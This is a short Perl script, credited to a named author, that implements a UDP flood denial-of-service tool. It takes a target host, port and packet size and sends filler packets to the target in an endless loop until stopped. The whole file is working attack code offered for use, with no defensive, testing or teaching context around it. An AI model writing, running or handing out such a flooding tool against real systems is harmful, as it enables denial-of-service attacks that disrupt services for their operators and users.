#!/usr/bin/perl
#udp flood
#Victor "m0nad" Ramos Mello
#victornrm at gmail.com | m0nad at email.com
use Socket;

my $host	= shift;
my $port	= shift or die "$0 <host> <port> [size]\n";

my $size	= shift || int rand (1500); #int rand 65507;
my $ipaddr	= inet_aton ($host);
my $portaddr	= sockaddr_in ($port, $ipaddr);
my $flood	= "a" x $size;

socket (SOCKET, PF_INET, SOCK_DGRAM, getprotobyname ("udp")) or die "socket: $!";
print "Crtl+C to stop\n";
send (SOCKET, $flood, 0, $portaddr) == length ($flood) or die "erro sendint to $host:$port\n $!" while 1;

